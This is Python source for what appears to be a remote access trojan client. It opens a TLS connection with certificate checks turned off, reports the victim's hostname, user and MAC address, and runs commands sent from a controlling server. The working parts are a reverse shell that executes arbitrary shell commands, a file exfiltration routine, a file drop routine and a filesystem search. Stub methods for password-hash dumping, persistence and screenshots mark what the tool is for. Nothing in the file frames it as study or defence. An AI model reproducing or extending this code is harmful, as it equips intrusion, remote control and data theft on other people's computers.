import socket, ssl, threading, os, subprocess
import platform, uuid, datetime
import hashlib
from getpass import getuser

from symbols import *

class Client:

    ####################################################################################################################
    ################################################# CONSTRUCTOR ######################################################
    ####################################################################################################################

    def __init__(self, server_address, server_port):
        self.server_address = server_address
        self.server_port = server_port
        self.secure_sock = None
        self.platform = platform.system()
        self.hostname = platform.uname()[1]
        self.user = getuser()
        self.mac = uuid.getnode()
        self.uid = self.getClientUID()
        self.commands = {
            'shell': self.reverse_shell,
            'screenshot': self.screenshot,
            'download': self.download,
            'upload': self.upload,
            'hashdump': self.hashdump,
            'search': self.search,
            'ipconfig': self.ipconfig,
            'kill': self.kill
        }
        self.agent_path = None
        self.is_killed = False

    ####################################################################################################################
    ########################################### CONNECTION HANDLING ####################################################
    ####################################################################################################################
    
    def connect(self):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.secure_sock = context.wrap_socket(sock, server_hostname=self.server_address)

        try:
            self.secure_sock.connect((self.server_address, self.server_port))

            information_json = self.getJSONHostInfos()
            self.secure_sock.sendall(information_json.encode())

            self.receive_commands()
        except Exception:
            pass
        finally:
            self.secure_sock.close()

    def receive_commands(self):
        
        receive_thread = threading.Thread(target=self._receive_commands)
        receive_thread.start()
        receive_thread.join()

    def _receive_commands(self):
        while True:
            try:
                command = self.secure_sock.recv(4096).decode()

                if command:
                    command_name, *args = command.split(' ')
                    command_name = command_name.lower()
                    if command_name in self.commands:
                        self.commands[command_name](' '.join(args))

                elif not command:
                    break
            except Exception as e:
                break

    ####################################################################################################################
    ############################################## USUAL METHODS #######################################################
    ####################################################################################################################

    def getJSONHostInfos(self):
        return f"{{\"hostname\": \"{self.hostname}\", \"user\": \"{self.user}\", \"mac\": \"{self.mac}\", \"uid\": \"{self.uid}\", \"timestamp\": \"{datetime.datetime.now()}\", \"os\": \"{platform.system()}\"}}"

    def getClientUID(self):
        """Create a UID combining the hostname the mac address and the user running the agent"""
        string = f"{self.hostname}{self.mac}{self.user}"
        hostUID = hashlib.sha256(string.encode()).hexdigest()
        return hostUID[:8]

    ####################################################################################################################
    ########################################### CLIENT COMMANDS ########################################################
    ####################################################################################################################

    def kill(self, args):
        self.secure_sock.close()
        self.is_killed = True

    def screenshot(self, args):
        raise NotImplementedError("This method should be implemented by subclasses")

    def reverse_shell(self, args):
        while True:
            command = self.secure_sock.recv(4096).decode()
            if command.strip().lower() == 'exit':
                break
            try:
                if command.lower().startswith('cd '):
                    directory = command[3:].strip()
                    os.chdir(directory)
                    output = f"Changed directory to {os.getcwd()}"
                else:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                    ####

            except subprocess.CalledProcessError as e:
                output = e.output
                self.secure_sock.send(output.encode())
                continue
            except Exception as e:
                output = str(e)
                self.secure_sock.send(output.encode())
                continue
            self.secure_sock.send(output.encode())

    def download(self, args):
        args = args.split(" ")
        for file_path in args:
            try:
                with open(file_path, 'rb') as f:
                    while chunk := f.read(4096):
                        self.secure_sock.sendall(chunk)
                self.secure_sock.sendall(SIG_EOF)
            except Exception as e:
                self.secure_sock.sendall(FILE_NOT_FOUND)

    def upload(self, args):
        try:
            with open(args, 'w+b') as f:
                while True:
                    data = self.secure_sock.recv(4096)
                    decoded_data = data.decode("latin1")
                    if data == SIG_EOF or not data:
                        break
                    if data == FILE_NOT_FOUND:
                        os.remove(f)
                        return
                    f.write(data)
        except Exception as e:
            return

    def hashdump(self, args):
        raise NotImplementedError("This method should be implemented by subclasses")

    def persistence(self):
        raise NotImplementedError("This method should be implemented by subclasses")

    def search(self, args):
        args = args.split(" ")
        filename = args[1]
        results = []
        for root, dir, files in os.walk(args[0]):
            if filename in files:
                results.append(os.path.join(root, filename))
        for file in results:
            self.secure_sock.sendall(file.encode())
        self.secure_sock.sendall(SIG_EOF)

    def ipconfig(self, args):
        raise NotImplementedError("This method should be implemented by subclasses")

